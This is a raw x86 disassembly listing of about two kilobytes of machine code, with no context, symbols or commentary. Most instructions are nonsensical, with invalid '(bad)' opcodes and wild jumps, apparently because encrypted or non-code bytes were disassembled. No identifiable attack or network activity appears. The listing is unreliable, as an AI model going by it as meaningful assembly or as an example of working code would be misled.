  4122ff:	adc    BYTE PTR [eax+0x62],cl
  412302:	ret    
  412303:	jns    0x4122a8
  412305:	cmp    DWORD PTR [ebx],edi
  412307:	or     ebp,DWORD PTR ds:0xa81eea76
  41230d:	adc    edi,eax
  41230f:	push   ss
  412310:	bndstx [esi-0xf],(bad)
  412314:	push   ds
  412315:	call   FWORD PTR [ebp-0x6b113b60]
  41231b:	add    BYTE PTR [eax+0x5a],bl
  41231e:	hlt    
  41231f:	pop    ebp
  412320:	jne    0x4122e2
  412322:	pop    edi
  412323:	pop    edi
  412324:	ins    BYTE PTR es:[edi],dx
  412325:	lock fsqrt 
  412328:	bound  ecx,QWORD PTR [esi]
  41232a:	dec    ebx
  41232b:	inc    esp
  41232c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41232d:	inc    edx
  41232e:	add    bh,cl
  412330:	sar    ah,1
  412332:	inc    ebx
  412333:	dec    eax
  412334:	adc    ch,BYTE PTR [esi+0x14]
  412337:	(bad)  
  412338:	pop    esp
  412339:	pushf  
  41233a:	es push esi
  41233c:	sbb    dh,BYTE PTR [edi]
  41233e:	in     al,0x46
  412340:	xchg   ebp,eax
  412341:	ret    0x4343
  412344:	adc    al,BYTE PTR [edi]
  412346:	dec    ebp
  412347:	neg    edx
  412349:	arpl   si,si
  41234b:	push   0xffffffdc
  41234d:	fsub   st,st(1)
  41234f:	add    dh,BYTE PTR ds:0xecfd5a62
  412355:	test   BYTE PTR [eax+ebx*8+0x42],ch
  412359:	cmc    
  41235a:	and    al,0x16
  41235c:	add    DWORD PTR [esi],ebx
  41235e:	sbb    dh,BYTE PTR [ebx-0x6b]
  412361:	xchg   BYTE PTR [esi],al
  412363:	pop    edx
  412364:	in     al,0x6e
  412366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412367:	ins    DWORD PTR es:[edi],dx
  412368:	cwde   
  412369:	cmp    eax,0x425b7822
  41236e:	popa   
  41236f:	xor    edi,DWORD PTR [eax]
  412371:	int    0xf3
  412373:	mov    bl,0xdd
  412375:	pop    edi
  412376:	std    
  412377:	inc    edx
  412378:	clc    
  412379:	jmp    0xd9510240
  41237e:	es sub eax,0x617acd00
  412384:	outs   dx,BYTE PTR ds:[esi]
  412385:	xor    eax,esp
  412387:	ret    
  412388:	les    esi,FWORD PTR [edx-0x55448e13]
  41238e:	outs   dx,BYTE PTR ds:[esi]
  41238f:	add    esi,DWORD PTR [edi+0x4a]
  412392:	cmp    eax,0xc8faf41e
  412397:	dec    ebx
  412398:	sub    BYTE PTR [ebx-0x6b389253],ah
  41239e:	enter  0xd48f,0x26
  4123a2:	sub    eax,0x5c0a2fcf
  4123a7:	loop   0x412334
  4123a9:	push   esi
  4123aa:	add    DWORD PTR [edi],edx
  4123ac:	bnd jnp 0x41235f
  4123af:	push   edi
  4123b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123b1:	inc    esi
  4123b2:	sbb    dh,dh
  4123b4:	jmp    0x9f574d80
  4123b9:	aad    0xeb
  4123bb:	mov    ss,WORD PTR [edx]
  4123bd:	outs   dx,DWORD PTR ds:[esi]
  4123be:	mov    WORD PTR [ecx-0x199f3529],gs
  4123c4:	clc    
  4123c5:	mov    bh,0xc3
  4123c7:	mov    dh,0x62
  4123c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ca:	mov    al,ch
  4123cc:	pop    eax
  4123cd:	shr    cl,0x75
  4123d0:	xor    dh,BYTE PTR ds:0xfff189fe
  4123d6:	loope  0x412429
  4123d8:	and    BYTE PTR [ebp+0x52acca9f],al
  4123de:	ins    DWORD PTR es:[edi],dx
  4123df:	int    0x41
  4123e1:	xchg   edx,eax
  4123e2:	(bad)  
  4123e4:	pusha  
  4123e5:	sub    bl,ah
  4123e7:	add    ah,BYTE PTR [edi+0xf380c39]
  4123ed:	cmp    BYTE PTR [edi+edi*8+0x6a8433be],ch
  4123f4:	popf   
  4123f5:	push   esp
  4123f6:	retf   0xf27
  4123f9:	xchg   DWORD PTR [esi+0x43],ebx
  4123fc:	xor    edx,DWORD PTR [ebp+eiz*4-0x5a82e896]
  412403:	inc    ecx
  412404:	xor    eax,0x7ede93a6
  412409:	(bad)  
  41240a:	mov    eax,0x8bb70590
  41240f:	ss fs retf 
  412412:	sbb    dh,BYTE PTR [eax+0x69]
  412415:	aaa    
  412416:	fimul  DWORD PTR [esi-0x42]
  412419:	stos   BYTE PTR es:[edi],al
  41241a:	pop    edx
  41241b:	icebp  
  41241c:	nop
  41241d:	xchg   esp,eax
  41241e:	cmp    BYTE PTR [edx+0x36e7ee14],al
  412424:	jmp    0x84bd27ee
  412429:	pop    es
  41242a:	fdivr  st(4),st
  41242c:	push   esp
  41242d:	dec    esp
  41242e:	imul   eax,DWORD PTR [ecx+0x4c],0x90f577c6
  412435:	in     eax,0x47
  412437:	or     ebx,edi
  412439:	test   BYTE PTR [edx+0x1b],ch
  41243c:	mov    bl,0xa0
  41243e:	les    edx,FWORD PTR [ebx-0x66705963]
  412444:	popf   
  412445:	out    0x28,eax
  412447:	stc    
  412448:	stc    
  412449:	pop    ds
  41244a:	xor    eax,ebx
  41244c:	aaa    
  41244d:	(bad)
  412450:	jne    0x412476
  412452:	dec    ebp
  412453:	int3   
  412454:	push   ebx
  412455:	fidivr WORD PTR [edi]
  412457:	cmp    eax,0x2b4f9712
  41245c:	call   0xced6de96
  412461:	js     0x4123ec
  412463:	adc    DWORD PTR [ebx+0x1c4a671a],edi
  412469:	hlt    
  41246a:	pop    es
  41246b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41246c:	xchg   esp,eax
  41246d:	push   0xffffff83
  41246f:	std    
  412470:	fwait
  412471:	mov    es,WORD PTR [bp+di-0xe]
  412475:	inc    esi
  412476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412477:	stos   DWORD PTR es:[edi],eax
  412478:	clc    
  412479:	mov    BYTE PTR [ebx-0x29],al
  41247c:	push   eax
  41247d:	loop   0x4124c9
  41247f:	sbb    eax,0xe4461b5d
  412484:	pop    es
  412485:	sub    eax,0x32e8ebfd
  41248a:	scas   eax,DWORD PTR es:[edi]
  41248b:	pop    ebx
  41248c:	cmc    
  41248d:	add    al,0x8b
  41248f:	repnz inc eax
  412491:	iret   
  412492:	ins    BYTE PTR es:[edi],dx
  412493:	pop    esp
  412494:	ret    0x7376
  412497:	cdq    
  412498:	ins    DWORD PTR es:[edi],dx
  412499:	sub    esi,DWORD PTR [eax+0x66a106f7]
  41249f:	repnz push ebx
  4124a1:	and    eax,0xee19e0d1
  4124a6:	dec    edi
  4124a7:	loop   0x412527
  4124a9:	mov    DWORD PTR fs:[ebp-0x1c],edx
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x7d1ebe60
  4124bf:	int3   
  4124c0:	int3   
  4124c1:	and    eax,0x78786e3d
  4124c6:	in     eax,0x7e
  4124c8:	js     0x412542
  4124ca:	add    ecx,DWORD PTR [ecx]
  4124cc:	lods   al,BYTE PTR ds:[esi]
  4124cd:	jbe    0x412476
  4124cf:	jo     0x41246e
  4124d1:	aad    0xb0
  4124d3:	mov    dh,0x1b
  4124d5:	mov    bh,0xa2
  4124d7:	sbb    BYTE PTR [esi-0x51],bl
  4124da:	mov    al,0x98
  4124dc:	gs test eax,0x8790f631
  4124e2:	mov    bl,0xf2
  4124e4:	in     al,dx
  4124e5:	push   edx
  4124e6:	clc    
  4124e7:	mov    esp,0x452927e6
  4124ec:	inc    ebp
  4124ed:	mov    ds:0x94695456,al
  4124f2:	shr    ch,0x57
  4124f5:	sbb    eax,0xa18ee6d9
  4124fa:	dec    esi
  4124fb:	xor    DWORD PTR [ecx-0x62],edx
  4124fe:	ficomp WORD PTR [ebp+0x70]
  412501:	hlt    
  412502:	shl    DWORD PTR [esi+0x1435e34f],0xd2
  412509:	mov    edi,0xbe0bfd63
  41250e:	xchg   al,cl
  412510:	mov    ds:0x88bc4f42,eax
  412515:	adc    eax,0xed0169d5
  41251a:	in     al,dx
  41251b:	add    ah,al
  41251d:	std    
  41251e:	mov    ds:0xc109f198,eax
  412523:	aas    
  412524:	test   ch,0xb5
  412527:	mov    bh,0xf4
  412529:	mov    dh,0x33
  41252b:	lods   al,BYTE PTR ds:[esi]
  41252c:	add    DWORD PTR [eax+ebx*1],eax
  41252f:	jge    0x4124db
  412531:	mov    eax,0x4c4ea2cf
  412536:	sti    
  412537:	add    eax,0x427cba08
  41253c:	push   edx
  41253d:	mov    eax,0x63af2628
  412542:	pop    eax
  412543:	test   BYTE PTR [edi],0xf
  412546:	iret   
  412547:	(bad)  
  412548:	aad    0xa2
  41254a:	repnz out dx,eax
  41254c:	jb     0x412574
  41254e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41254f:	fist   WORD PTR [ebx+0x2435d7b0]
  412555:	fst    QWORD PTR [ebx+0x41d3b556]
  41255b:	xor    bh,bh
  41255d:	popf   
  41255e:	imul   esp,DWORD PTR ds:0xf7d51db1,0xffffff89
  412565:	xor    eax,0xe0383777
  41256a:	dec    ebx
  41256b:	popa   
  41256c:	sub    al,0xa4
  41256e:	dec    edx
  41256f:	cmp    cl,bh
  412571:	gs xchg ebp,eax
  412573:	xchg   ebp,eax
  412574:	in     eax,dx
  412575:	scas   al,BYTE PTR es:[edi]
  412576:	ss into 
  412578:	ins    DWORD PTR es:[edi],dx
  412579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41257a:	mov    ch,0xfd
  41257c:	inc    esp
  41257d:	mov    ecx,0x3975744f
  412582:	push   cs
  412583:	xchg   edi,eax
  412584:	push   esp
  412585:	pop    esi
  412586:	pop    ecx
  412587:	(bad)
  41258a:	rcl    DWORD PTR [ebx-0x1a],1
  41258d:	and    ah,bl
  41258f:	cmp    BYTE PTR [ebx+eiz*8-0xa30ca66],dl
  412596:	or     ebp,esi
  412598:	sti    
  412599:	in     eax,0xd8
  41259b:	mov    DWORD PTR [eax],esp
  41259d:	mov    esi,0xf2ecc015
  4125a2:	daa    
  4125a3:	xor    al,0xa9
  4125a5:	repnz rcl dl,1
  4125a8:	inc    edx
  4125a9:	mov    DWORD PTR [ecx+0xb79296a],ecx
  4125af:	push   edi
  4125b0:	mov    esi,0x4dae2547
  4125b5:	add    eax,0xbae5fadf
  4125ba:	inc    esp
  4125bb:	fadd   QWORD PTR [esi+0x42]
  4125be:	test   esp,edx
  4125c0:	popf   
  4125c1:	and    al,0xc7
  4125c3:	dec    eax
  4125c4:	mov    esi,0xf44e3afb
  4125c9:	push   ds
  4125ca:	and    DWORD PTR ds:0x6faa6e26,ebx
  4125d0:	jl     0x4125a9
  4125d2:	add    DWORD PTR [ecx+0x46],eax
  4125d5:	fisubr WORD PTR [edx+0x21]
  4125d8:	adc    ecx,ecx
  4125da:	adc    al,al
  4125dc:	or     al,0xff
  4125de:	push   0x1b
  4125e0:	mov    esp,0xc3d6a4f1
  4125e5:	jae    0x4125fc
  4125e7:	and    eax,0x8508aec1
  4125ec:	jle    0x412653
  4125ee:	push   ds
  4125ef:	pushf  
  4125f0:	jne    0x4125a8
  4125f2:	xchg   ebx,eax
  4125f3:	(bad)  [ecx+0x1f]
  4125f6:	jmp    0x412625
  4125f8:	jmp    0x4125d3
  4125fa:	rcr    DWORD PTR [esi+0x55aaac67],1
  412600:	mov    eax,0xff1620ae
  412605:	push   eax
  412606:	(bad)  [ecx+0x471acf9d]
  41260c:	iret   
  41260d:	std    
  41260e:	cmc    
  41260f:	add    bh,BYTE PTR [edx-0x48]
  412612:	mov    ebx,0xcda4e7e6
  412617:	test   eax,0x9567be47
  41261c:	in     eax,dx
  41261d:	push   ss
  41261e:	fsub   DWORD PTR [ecx+ebp*8-0x4b]
  412622:	cli    
  412623:	sbb    DWORD PTR [eax+eiz*1+0x18],esi
  412627:	xchg   ebp,eax
  412628:	push   edx
  412629:	ret    0xf151
  41262c:	mov    al,ds:0x8b4d81c1
  412631:	shr    DWORD PTR [eax+0x7b1df42c],1
  412637:	jo     0x412622
  412639:	pusha  
  41263a:	scas   al,BYTE PTR es:[edi]
  41263b:	dec    edx
  41263c:	je     0x4125da
  41263e:	imul   esi,esi,0xffffffe5
  412641:	fwait
  412642:	xor    edi,0x92a8fec4
  412648:	out    0x6c,al
  41264a:	iret   
  41264b:	sbb    eax,0x9ec62aee
  412650:	or     al,bl
  412652:	addr16 push 0x7cb31514
  412658:	push   edi
  412659:	adc    BYTE PTR [esi],0xc8
  41265c:	pop    ds
  41265d:	sbb    BYTE PTR [ebp-0x6fecc4b3],ah
  412663:	dec    esp
  412664:	sbb    eax,0xdabbd8ef
  412669:	fs dec edx
  41266b:	test   BYTE PTR [ebx+0x4b],0x1a
  41266f:	retf   
  412670:	xchg   esi,eax
  412671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412672:	and    DWORD PTR [edx+eax*8+0xd],ebp
  412676:	add    BYTE PTR [eax],ch
  412678:	add    DWORD PTR [ebx],edi
  41267a:	push   ecx
  41267b:	pop    esi
  41267c:	xchg   ebp,eax
  41267d:	sub    edx,DWORD PTR [ebx-0x4fd17c16]
  412683:	or     DWORD PTR [ebp+0x25],esi
  412686:	ds xchg edx,eax
  412688:	or     al,0xaa
  41268a:	cdq    
  41268b:	sub    al,0x85
  41268d:	push   es
  41268e:	xchg   esi,eax
  41268f:	or     BYTE PTR [esi-0x5dcabb00],ch
  412695:	pushf  
  412696:	jle    0x4126df
  412698:	(bad)  
  412699:	jb     0x412640
  41269b:	jp     0x412707
  41269d:	addr16 pop esp
  41269f:	push   ecx
  4126a0:	jne    0x58a8dbb9
  4126a6:	mov    al,0x99
  4126a8:	pop    ecx
  4126a9:	aas    
  4126aa:	cmc    
  4126ab:	into   
  4126ac:	pop    edi
  4126ad:	xor    al,0x95
  4126af:	adc    dh,BYTE PTR [edx-0x78]
  4126b2:	mov    bh,0x1e
  4126b4:	or     DWORD PTR es:[esi],ebx
  4126b7:	jne    0x4126db
  4126b9:	jl     0x41267f
  4126bb:	lds    ebx,FWORD PTR [esi-0x7d]
  4126be:	rol    BYTE PTR [ebx+0x255cf773],cl
  4126c4:	std    
  4126c5:	lds    eax,FWORD PTR [edx+0x41]
  4126c8:	mov    ecx,DWORD PTR [ebp+0x36111017]
  4126ce:	jns    0x41271a
  4126d0:	dec    edx
  4126d1:	mov    al,ds:0xbd767f8c
  4126d6:	(bad)  
  4126d7:	push   ebx
  4126d8:	adc    eax,0x4d0385e7
  4126dd:	imul   ebx,DWORD PTR [edx],0x4f
  4126e0:	xor    ecx,eax
  4126e2:	sub    eax,edi
  4126e4:	cld    
  4126e5:	rcr    BYTE PTR ds:0x90cb6373,0x3b
  4126ec:	(bad)  
  4126ed:	sti    
  4126ee:	xor    al,0x53
  4126f0:	sub    DWORD PTR [ecx-0x5e6b0206],esi
  4126f6:	jecxz  0x4126ce
  4126f8:	mov    eax,ds:0xabf8d515
  4126fd:	shl    BYTE PTR [edi],1
  4126ff:	stc    
  412700:	cmp    dh,BYTE PTR [ebp+0x3d3cf314]
  412706:	addr16 aas 
  412708:	sbb    eax,0x2b71751b
  41270d:	pop    esi
  41270e:	repz mov cl,0x27
  412711:	in     al,dx
  412712:	xor    BYTE PTR [ebp+0x78],0x25
  412716:	mov    bh,bl
  412718:	adc    DWORD PTR [eax],edi
  41271a:	cmp    edi,esp
  41271c:	js     0x412771
  41271e:	mov    esp,0xee9ba3
  412723:	pop    edx
  412724:	add    cl,0xda
  412727:	fsub   QWORD PTR [eax-0x73a92e62]
  41272d:	jo     0x4126c3
  41272f:	jle    0x41279a
  412731:	and    ch,BYTE PTR [ebp+0x37]
  412734:	jmp    0x9c85:0x39f445c7
  41273b:	clc    
  41273c:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	cwde   
  412755:	push   ecx
  412756:	cwde   
  412757:	rsm    
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	and    BYTE PTR [ecx],ch
  412762:	and    DWORD PTR ds:0x65081e40,esi
  412768:	clc    
  412769:	into   
  41276a:	mov    WORD PTR [ecx-0x63],ds
  41276d:	adc    eax,0xc939d5b
  412772:	push   edx
  412773:	add    eax,0x2ef9b78e
  412778:	sbb    esp,ecx
  41277a:	test   bl,ah
  41277c:	sub    al,0x28
  41277e:	mov    bl,BYTE PTR [ebp+0x5208e709]
  412784:	mov    ebp,0x9b9dd3a7
  412789:	icebp  
  41278a:	sub    edx,DWORD PTR [ebx+0x41]
  41278d:	xlat   BYTE PTR ds:[ebx]
  41278e:	popf   
  41278f:	rcr    BYTE PTR [ecx+0x7ca52cd7],0x55
  412796:	xchg   BYTE PTR [ecx],dl
  412798:	ins    DWORD PTR es:[edi],dx
  412799:	push   ebp
  41279a:	test   al,0x3d
  41279c:	lahf   
  41279d:	inc    edi
  41279e:	aas    
  41279f:	enter  0xdbbe,0x32
  4127a3:	cmp    eax,esi
  4127a5:	cdq    
  4127a6:	sar    edx,cl
  4127a8:	inc    edx
  4127a9:	push   edx
  4127aa:	sbb    ah,dl
  4127ac:	xchg   esp,eax
  4127ad:	out    dx,al
  4127ae:	lods   eax,DWORD PTR ds:[esi]
  4127af:	push   ds
  4127b0:	mov    eax,ds:0x4507e0ca
  4127b5:	fcmovbe st,st(1)
  4127b7:	rcr    BYTE PTR ds:0x9f0a0b2a,0x65
  4127be:	add    DWORD PTR [ebx],edi
  4127c0:	mov    ebp,0x8c808ff
  4127c5:	xchg   ebx,eax
  4127c6:	inc    ebx
  4127c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c8:	dec    ecx
  4127c9:	or     BYTE PTR [edx-0x17f3c743],0xf6
  4127d0:	shr    DWORD PTR [ecx+0x6e0f2405],0x27
  4127d7:	in     al,dx
  4127d8:	jmp    0x412775
  4127da:	xor    ebp,DWORD PTR [ecx-0x5ab0e311]
  4127e0:	scas   eax,DWORD PTR es:[edi]
  4127e1:	sbb    dh,BYTE PTR [ebx]
  4127e3:	(bad)  
  4127e4:	sbb    ah,al
  4127e6:	xor    BYTE PTR [ecx],ah
  4127e8:	fcmovnbe st,st(2)
  4127ea:	jae    0x4127c3
  4127ec:	xchg   ebx,eax
  4127ed:	xor    cl,BYTE PTR [esi]
  4127ef:	in     eax,0xb4
  4127f1:	pop    ss
  4127f2:	ja     0x4127f7
  4127f4:	add    edi,DWORD PTR [ecx*8+0x5dd38e3c]
  4127fb:	xchg   edx,eax
  4127fc:	fistp  WORD PTR [edx-0x402c7563]
  412802:	int    0xbf
  412804:	jae    0x4127b7
  412806:	cmp    BYTE PTR [edi*2-0x62243008],0xa5
  41280e:	push   esp
  41280f:	comiss xmm4,DWORD PTR [ecx+0x5ecdfbc2]
  412816:	push   ebx
  412817:	jae    0x412870
  412819:	jne    0x41285e
  41281b:	sub    eax,0x76da3374
  412820:	std    
  412821:	int    0x1c
  412823:	sti    
  412824:	hlt    
  412825:	cmp    eax,0xc6b93a92
  41282a:	jg     0x4127eb
  41282c:	pop    es
  41282d:	cwde   
  41282e:	into   
  41282f:	pop    ss
  412830:	mov    BYTE PTR [eax-0x21ca8612],dl
  412836:	les    esp,FWORD PTR ds:0x7529eb64
  41283c:	(bad)
  412840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412841:	inc    ebx
  412842:	sub    BYTE PTR [esi],ch
  412844:	imul   ebx,DWORD PTR [eax+edx*8-0x5d],0x9ca16c18
  41284c:	ss sub ecx,esi
  41284f:	pop    ecx
  412850:	xchg   edi,eax
  412851:	xor    BYTE PTR [ebx+0x3d],cl
  412854:	xchg   ebp,eax
  412855:	jg     0x412887
  412857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412858:	or     bl,bh
  41285a:	out    dx,eax
  41285b:	sahf   
  41285c:	std    
  41285d:	and    esp,ecx
  41285f:	pop    es
  412860:	sti    
  412861:	pop    es
  412862:	enter  0x45aa,0x7b
  412866:	fnsave [edi+esi*4+0x1dfd4fd0]
  41286d:	ror    bl,1
  41286f:	add    ch,bh
  412871:	xchg   edx,eax
  412872:	push   es
  412873:	rcr    BYTE PTR [edi],1
  412875:	and    DWORD PTR [esi-0x3199cde0],esp
  41287b:	call   0x3176c7e8
  412880:	sub    ah,BYTE PTR [ebx-0x5e9efe00]
  412886:	xchg   ebx,eax
  412887:	xchg   ecx,eax
  412888:	pop    es
  412889:	in     al,dx
  41288a:	dec    ecx
  41288b:	jae    0x412873
  41288d:	std    
  41288e:	and    DWORD PTR [edx-0x6b],0xb40b6e50
  412895:	pop    esi
  412896:	(bad)  
  412897:	mov    ebp,0xbee447ca
  41289c:	nop
  41289d:	hlt    
  41289e:	mov    esp,0xdeb2b1e0
  4128a3:	sub    BYTE PTR [esi+0x0],dh
  4128a6:	jmp    0x74ec4759
  4128ab:	imul   BYTE PTR [edx+0x5a]
  4128ae:	jle    0x4128e4
  4128b0:	test   eax,0x142474bd
  4128b5:	inc    edi
  4128b6:	inc    esp
  4128b7:	mov    ecx,0x15b7780f
  4128bc:	add    ch,BYTE PTR [eax+0x62]
  4128bf:	cmp    al,0xca
  4128c1:	pop    ecx
  4128c2:	clc    
  4128c3:	arpl   WORD PTR [edi-0x16],bx
  4128c6:	ja     0x412867
  4128c8:	shr    DWORD PTR [ebx+0x56862c67],1
  4128ce:	mov    edx,DWORD PTR [esp+ebp*4]
  4128d1:	fcom   QWORD PTR [ebp-0x35655f83]
  4128d7:	jns    0x41286b
  4128d9:	jne    0x412934
  4128db:	pop    ecx
  4128dc:	loop   0x412881
  4128de:	jl     0x412950
  4128e0:	sbb    al,0xfd
  4128e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128e3:	sub    edi,ecx
  4128e5:	enter  0x5a29,0x20
  4128e9:	stos   DWORD PTR es:[edi],eax
  4128ea:	iret   
  4128eb:	mov    esi,0x56f90f84
  4128f0:	xchg   ecx,eax
  4128f1:	into   
  4128f2:	shr    BYTE PTR [edx+ebp*8],0x18
  4128f6:	arpl   WORD PTR [edx-0x1f],sp
  4128f9:	rcl    ch,cl
  4128fb:	add    DWORD PTR [ecx],eax
  4128fd:	popf   
  4128fe:	inc    edx
  4128ff:	std    
  412900:	in     eax,0xcc
  412902:	mov    DWORD PTR ds:0x2e3c887e,ebx
  412908:	loop   0x41288c
  41290a:	sub    eax,0xfc58f292
  41290f:	mov    bh,bl
  412911:	push   ds
  412912:	es inc esp
  412914:	jne    0x412912
  412916:	neg    BYTE PTR [edx-0x7a]
  412919:	in     eax,dx
  41291a:	push   ebx
  41291b:	outs   dx,DWORD PTR ds:[esi]
  41291c:	pusha  
  41291d:	iret   
  41291e:	(bad)  
  41291f:	pop    eax
  412920:	shr    BYTE PTR [eax-0x1536661e],1
  412926:	ja     0x412970
  412928:	jbe    0x4128bc
  41292a:	jl     0x4129ab
  41292c:	mov    esp,0xe7215ea6
  412931:	sbb    eax,0x61669e96
  412936:	fwait
  412937:	(bad)
  41293b:	das    
  41293c:	add    esi,DWORD PTR [esi-0x6c6c9fd4]
  412942:	call   0x9a1e7313
  412947:	push   edi
  412948:	repnz arpl WORD PTR [edx+0x12],sp
  41294c:	fcomp  QWORD PTR [ebx+edx*4-0x6d15fe10]
  412953:	out    dx,eax
  412954:	(bad)  
  412955:	xchg   DWORD PTR [esi+esi*1-0x24de9c4b],ecx
  41295c:	jecxz  0x412988
  41295e:	repz mov al,ds:0xd18e47a7
  412964:	subps  xmm5,xmm1
  412967:	es aaa 
  412969:	ins    BYTE PTR es:[edi],dx
  41296a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41296b:	retf   0x285b
  41296e:	mov    gs,ebp
  412970:	push   cs
  412971:	gs mov ch,0x30
  412974:	scas   al,BYTE PTR es:[edi]
  412975:	mov    dl,0xd9
  412977:	or     edx,DWORD PTR [edi]
  412979:	push   eax
  41297a:	pushf  
  41297b:	jb     0x4129bd
  41297d:	jmp    0xced8:0x99be0b2f
  412984:	push   esp
  412985:	cmp    BYTE PTR [edi],bh
  412987:	mov    edx,0xfcc80cc0
  41298c:	inc    edi
  41298d:	and    al,0x74
  412990:	add    al,0x79
  412992:	scas   eax,DWORD PTR es:[edi]
  412993:	mov    cl,0x6a
  412995:	sbb    ch,BYTE PTR [esi+0x30]
  412998:	enter  0x2bb7,0xec
  41299c:	call   0x9f5295e5
  4129a1:	ins    BYTE PTR es:[edi],dx
  4129a2:	xchg   edi,eax
  4129a3:	in     al,dx
  4129a4:	push   ds
  4129a5:	cli    
  4129a6:	add    eax,0x6d59e075
  4129ab:	in     al,0x18
  4129ad:	(bad)  
  4129af:	mov    cr4,ebp
  4129b2:	nop
  4129b3:	xchg   edi,eax
  4129b4:	stos   DWORD PTR es:[edi],eax
  4129b5:	inc    esi
  4129b6:	and    DWORD PTR [ebx],ecx
  4129b8:	mov    ecx,0xa06003aa
  4129be:	jle    0x4129a9
  4129c0:	hlt    
  4129c1:	push   esi
  4129c2:	sbb    BYTE PTR [edx+eiz*2-0x3a89fa26],al
  4129c9:	sub    DWORD PTR [ebx],edx
  4129cb:	mov    edx,DWORD PTR [ebp-0x18]
  4129ce:	xor    edx,eax
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a14
  4129f1:	mov    al,0x74
  4129f3:	test   eax,0x78787117
  4129f8:	in     eax,0x7e
  4129fa:	js     0x412a74
  4129fc:	je     0x4129da
  4129fe:	ss mov edi,0x6f5eaf82
  412a04:	adc    ecx,0x3dbf2b35
  412a0a:	add    DWORD PTR [esi+0x1d],esp
  412a0d:	aaa    
  412a0e:	push   ds
  412a0f:	xchg   edx,eax
  412a10:	jne    0x4129f6
  412a12:	inc    edi
  412a13:	push   cs
  412a14:	jmp    0xd1afa515
  412a19:	test   al,0x2d
  412a1b:	(bad)  
  412a1c:	pop    ss
  412a1d:	call   0x67754068
  412a22:	and    bh,BYTE PTR [edx-0x73]
  412a25:	adc    eax,0x6c55e796
  412a2a:	mov    dh,0xd6
  412a2c:	aaa    
  412a2d:	mov    esi,0x55b314a8
  412a32:	int3   
  412a33:	pop    ss
  412a34:	in     al,dx
  412a35:	adc    dl,al
  412a37:	push   edx
  412a38:	cmp    eax,0xb7a7192f
  412a3d:	mov    al,0x28
  412a3f:	pop    ebp
  412a40:	pushf  
  412a41:	add    eax,0x46149c27
  412a46:	mov    ebp,0xba51f479
  412a4b:	inc    ebx
  412a4c:	fld    TBYTE PTR [esi-0x4b6f5a21]
  412a52:	mov    edi,0x73a04d40
  412a57:	sub    BYTE PTR [ecx-0x37788999],dl
  412a5d:	in     eax,dx
  412a5e:	dec    ecx
  412a5f:	or     al,0x3b
  412a61:	or     bl,ch
  412a63:	add    ecx,DWORD PTR [edi-0x643653eb]
  412a69:	les    ebp,FWORD PTR [eax+esi*8]
  412a6c:	cmp    BYTE PTR [eax+0x58],ah
  412a6f:	scas   al,BYTE PTR es:[edi]
  412a70:	sbb    BYTE PTR [ebx*4+0x1c5b6eff],ah
  412a77:	xor    BYTE PTR ds:0xbe1884ff,ah
  412a7d:	jae    0x412a92
  412a7f:	cli    
  412a80:	cdq    
  412a81:	aam    0x50
  412a83:	add    al,0xac
  412a85:	and    DWORD PTR [ebx],ebx
  412a87:	pop    esp
  412a88:	fsub   QWORD PTR [edx]
  412a8a:	out    0xc1,eax
  412a8c:	fs xchg esp,eax
  412a8e:	iret   
  412a8f:	ds push 0xfbe1a4dc
  412a95:	push   ecx
  412a96:	aam    0xee
  412a98:	push   ebx
  412a99:	sub    al,0xa3
  412a9b:	test   al,0xbe
  412a9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a9e:	cmp    eax,0x56cb2e2c
  412aa3:	test   BYTE PTR fs:[eax-0x140f5ecd],dl
  412aaa:	retf   0x1bb0
  412aad:	jno    0x412a3d
  412aaf:	adc    DWORD PTR [edx],eax
  412ab1:	mov    al,ds:0xbb323016
  412ab6:	outs   dx,DWORD PTR ds:[esi]
  412ab7:	and    ch,BYTE PTR [ecx+eax*1-0x1512cdb3]
  412abe:	fcomp  st(0)
  412ac0:	and    eax,0x54ac551
  412ac5:	ret    0x7c9a
  412ac8:	or     eax,0x5f570c8
  412acd:	test   ebp,edi
  412acf:	inc    eax
  412ad0:	imul   ecx,DWORD PTR [ecx+edx*8],0x96f55090
  412ad7:	pop    eax
  412ad8:	clc    
  412ad9:	cmc    
  412ada:	jne    0x412a7f
  412adc:	dec    ebx
  412add:	sahf   
  412ade:	push   ss
  412adf:	stos   BYTE PTR es:[edi],al
  412ae0:	adc    ch,BYTE PTR [esi+edi*2]
  412ae3:	sub    eax,0xa143fffa
  412ae8:	jae    0x412ac2
  412aea:	fcomip st,st(0)
  412aec:	ins    DWORD PTR es:[edi],dx
  412aed:	fist   WORD PTR [ecx-0x66]
  412af0:	cmp    BYTE PTR [ebx-0x1c],dl
  412af3:	sar    BYTE PTR [ecx-0x6a0332e4],cl
  412af9:	in     al,dx
